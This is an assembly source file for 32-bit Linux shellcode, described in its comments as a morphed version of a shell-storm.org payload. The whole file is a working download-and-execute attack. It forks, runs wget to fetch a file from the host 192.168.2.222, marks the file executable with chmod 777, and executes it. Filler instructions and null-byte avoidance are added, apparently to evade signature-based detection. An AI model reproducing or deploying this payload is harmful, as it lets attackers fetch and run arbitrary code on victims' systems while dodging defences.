; Shellcode purpose - Download, chmod and execute a file
; This shellcode is a morphed version of a shellcode taken from shell-storm.org
; OG Shellcode - http://shell-storm.org/shellcode/files/shellcode-862.php

global _start
section .text
_start:
    ;fork
    xor ebx, ebx ;
    mov ebx, 0x1 ;
    xor ebx, ebx ;
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    sub al,0x1 ;
    inc eax    ;
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    xor edx, edx ;
    inc edx      ;
    dec edx      ;
    push eax
    mov al, 0xf ;chmod
    push 0x78   ; x = filename
    mov ebx, esp ; pathname
    xor ecx, ecx
    mov cx, 0x1ff ; 511
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 20 ;
    sub al, 9  ; al = 11
;    mov al, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    push 0x782f2f32 ;2//x avoid null byte
    push 0x32322e32 ;22.2
    push 0x2e383631 ;.861
    push 0x2e323931 ;.291
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
